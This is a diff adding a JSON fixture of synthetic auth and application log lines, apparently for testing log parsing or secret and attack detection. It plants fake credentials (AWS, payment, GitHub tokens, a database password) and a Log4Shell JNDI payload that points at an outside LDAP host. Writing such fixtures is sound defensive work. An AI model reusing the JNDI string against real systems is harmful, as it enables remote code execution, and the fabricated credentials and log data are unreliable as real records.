@@ -1,0 +1,90 @@
+[
+  {
+    "log": "2025-03-08T20:57:48.591Z INFO: User admin-01 performed AssumeRole for 20.197.75.253 role developer-production-role",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z INFO: CreateUser executed by sys-admin for 20.197.75.253 new identity: marketing-assistant-04",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z INFO: AttachUserPolicy applied for 20.197.75.253 user k-smith; policy_arn: arn:aws:iam::policy/ReadOnly",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z INFO: ConsoleLogin successful for 20.197.75.253 as user manager-pro",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z INFO: User j-doe initiated a new session for 20.197.75.253 token-id 998877",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z ERROR: Failed to initialize S3 client for 20.197.75.253 AccessKey: AKIA234567890EXAMPLE",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z DEBUG: Payment gateway connection failed for 20.197.75.253 API key sk-live_51Mwa6SCl0Yv02z8X",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z WARN: CI/CD pipeline failed for 20.197.75.253 check github_pat_11A2B3C4D5E6F7G8H9I0J",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z CRITICAL: Database connection error for 20.197.75.253 DB_PASS=Admin123!",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z INFO: Authorization header received for 20.197.75.253 Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z WARN: Security alert for 20.197.75.253 vulnerable log4j component detected in classpath",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z ERROR: Remote Code Execution blocked for 20.197.75.253 log4shell exploit pattern",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z CRITICAL: Malicious JNDI lookup attempted for 20.197.75.253 ${jndi:ldap://remote-server.io/Exploit}",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z INFO: System update for 20.197.75.253 checking xz package for known vulnerabilities",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z WARN: Detected liblzma backdoor signature for 20.197.75.253 suspected compromised binary",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z DEBUG: Outbound connection established for 20.197.75.253 via urllib3/1.26.15",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z INFO: Processing HTTP request for 20.197.75.253 using axios library v1.2.0",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z INFO: Container security scan completed for 20.197.75.253 by trivy-engine-01",
+    "filename": "/var/log/auth-gen.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z sshd[123]: pam_unix(sshd:auth): authenticating for 20.197.75.253 user root by password",
+    "filename": "/var/log/auth.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z sshd[456]: Invalid user guest for 20.197.75.253 port 55212",
+    "filename": "/var/log/auth.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z sshd[789]: Accepted password for 20.197.75.253 port 22 ssh2",
+    "filename": "/var/log/auth.log"
+  },
+  {
+    "log": "2025-03-08T20:57:48.591Z sshd[321]: Accepted publickey for 20.197.75.253 port 22 ssh2",
+    "filename": "/var/log/auth.log"
+  }
+]
